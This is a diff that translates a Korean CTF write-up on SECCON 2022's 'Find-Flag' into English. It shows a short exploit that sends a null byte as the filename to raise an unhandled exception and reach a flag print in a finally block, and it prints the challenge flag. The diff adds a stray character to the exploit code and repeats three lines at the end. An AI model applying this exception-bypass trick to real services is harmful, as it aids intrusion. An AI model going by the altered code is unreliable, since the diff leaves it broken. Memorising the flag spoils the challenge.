@@ -5,11 +5,12 @@ parent: SECCON 2022
 tags: [MISC]
 grand_parent: CTF Write-ups
 nav_order: 2
-lang: ko
+lang: en
 lang-ref: SECCON 2022 - find - flag
+hidden: true
 ---
 
-# Find-Flag
+# Find-Flag_en
 
 ```python
 #server.py
@@ -60,9 +61,9 @@ if __name__ == '__main__':
             print(FLAG.decode())
 ```
 
-위의 코드에서 주목할 점은 FLAG print가 finally 안에 있다는 것이다.
+What is noteworthy about the above code is that the FLAG output is in the FINALLY.
 
-즉, check() 함수에서 예외를 발생시켜서 check 과정을 우회 할 수 있는 것이다.
+In other words, In the check() function, we can make an exception and bypass the check process.
 
 ```python
 except FileNotFoundError:
@@ -75,11 +76,11 @@ except FileNotFoundError:
         print("[-] hurting my eyes")
 ```
 
-check() 함수에서 예외 처리 된 ERROR 목록이다.
+An ERROR list exceptionally processed by the check() function.
 
-해당 예외가 아닌 다른 예외를 일으키면 우회가 가능하다.
+It is possible to make a detour by making other exceptions that are not applicable.
 
-나는 ValueError: embedded null byte를 사용하여 우회를 진행하였다
+I proceeded the detour using ValueError: embedded null byte.
 
 ```c
 //local_setup.c
@@ -93,7 +94,7 @@ void main()
 }
 ```
 
-위는 Docker를 실행하지 않고 로컬에서 돌리기 위해 c 코드를 사용하여 코드를 실행 시키는 과정이다.
+The above is a process in which the code is executed using the c code in order to turn it locally without running Docker.
 
 ```python
 #exploit.py
@@ -116,9 +117,15 @@ payload = b'\x00'
 
 p.recvuntil(b'filename: ')
 p.sendline(payload)
-print(p.recv())
+print(p.recv())F
 ```
 
 ![image](/assets/images/SECCON2022/Find-Flag/find-flag.png)
 
-`FLAG: SECCON{exit_1n_Pyth0n_d0es_n0t_c4ll_exit_sysc4ll}`
+FLAG: SECCON{exit_1n_Pyth0n_d0es_n0t_c4ll_exit_sysc4ll}
+
+An ERROR list exceptionally processed by the check() function.
+
+It is possible to make a detour by making other exceptions that are not applicable.
+
+I proceeded the detour using ValueError: embedded null byte.
